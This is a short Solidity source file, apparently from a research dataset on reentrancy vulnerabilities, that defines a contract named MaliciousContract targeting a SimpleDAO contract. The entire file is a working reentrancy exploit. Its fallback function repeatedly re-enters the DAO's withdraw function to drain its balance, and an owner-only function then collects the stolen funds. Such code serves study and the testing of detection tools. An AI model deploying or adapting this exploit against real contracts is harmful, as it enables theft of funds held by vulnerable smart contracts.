pragma solidity ^0.4.2;

import "../dataset/reentrancy/simple_dao.sol";



contract MaliciousContract {
    SimpleDAO public dao;
    address public owner;

    constructor(address _daoAddress) {
        dao = SimpleDAO(_daoAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        dao.donate.value(msg.value)(address(this));
        dao.withdraw(msg.value);
    }

    function () public payable {
        if (address(dao).balance >= msg.value) {
            dao.withdraw(msg.value);
        }
    }

    function collectRemaining() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}
